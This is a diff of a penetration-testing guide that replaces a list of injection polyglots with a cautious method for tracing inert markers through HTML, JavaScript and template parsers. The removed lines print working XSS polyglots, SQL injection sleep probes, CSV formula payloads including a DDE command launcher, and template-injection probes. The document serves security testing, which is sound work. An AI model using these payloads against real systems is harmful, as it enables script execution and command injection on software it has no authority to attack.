@@ -1,37 +1,29 @@
-# PAYLOADS — Polyglots
+# Polyglots: select only after understanding the parsers
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [XSS](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/xss_reflected_stored_dom.md).
 
-## 13. Polyglots
+Prefer a small context-specific payload/control. A polyglot combines grammar
+breakouts, which also makes its failure harder to interpret. Do not use one as a
+universal detector or infer an absence of injection when it fails.
 
-### CLASSIC XSS POLYGLOT (0xSobky)
-```
-jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
-```
+## Differential construction
 
-### SHORTER POLYGLOTS
-```
-"><svg/onload=alert(1)>'-alert(1)-'
+1. Trace an inert `AUDIT_MARKER` through the actual transformations.
+2. Record which HTML/JavaScript/URL/template parser consumes which substring.
+3. Obtain a working harmless control for each context in an isolated fixture.
+4. Combine only the breakouts needed by the observed path; test each intermediate
+   output, not just the final response. Encoding belongs to a specific layer.
+5. Compare against an inert string with the same delimiters/length where possible.
+6. Verify actual execution origin, browser restrictions and victim delivery.
 
-/*</style></script>"><svg onload=alert(1)>
+`AUDIT_MARKER<>&"'` is a parser/escaping observation marker, **not** an execution
+payload. `<span data-audit="AUDIT_MARKER">AUDIT_MARKER</span>` can distinguish HTML
+rendering from literal text in an owned fixture; rendering HTML alone is not XSS.
+CSV formulas, remote redirects and template expressions belong to their own
+consumer-specific methodologies; do not combine them into one expected result.
 
-';alert(1)//\\";alert(1)//"-prompt(1)//\\"-prompt(1)//<svg/onload=alert(1)>
-```
+## Primary references
 
-### SQLI / COMBO / CSV / SSTI / XSS+REDIRECT
-```
-SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
-
-'-alert(1)-'<svg/onload=alert(1)>
-
-=cmd|'/c calc'!A1
-@SUM(1+1)
-=HYPERLINK("javascript:alert(1)","Click")
-
-${{<%[%'"}}%\\
-${7*7}{{7*7}}<%=7*7%>#{7*7}*{7*7}@{7*7}
-
-javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
-```
-
----
+- [PortSwigger XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts) — why parser context changes the payload.
+- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — encoding is context-specific.
+- [WHATWG HTML parsing](https://html.spec.whatwg.org/multipage/parsing.html) — HTML parser states and recovery.
